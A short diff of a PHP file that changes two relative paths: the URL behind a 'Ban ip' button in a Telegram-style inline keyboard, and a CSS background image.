@@ -79,7 +79,7 @@ if (!$Live_panel || $step == "1" || $step == "2") {
     $inline_keyboard = array(
         'inline_keyboard' => array(
             array(
-                array('text' => 'Ban ip', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['ban']),
+                array('text' => 'Ban ip', 'url' => $base_url . "query.php?ip=" . urlencode($ip) . "&" . $stepes['ban']),
             ),
         )
     );
@@ -124,7 +124,7 @@ if ($_SESSION['allow'] == "yes") {
             margin: 0;
             padding: 0;
             background-color: black; 
-            background-image: url('files/img/back.jpg');
+            background-image: url('back.jpg');
             background-repeat: no-repeat;
             background-position: center center;
             background-attachment: fixed;
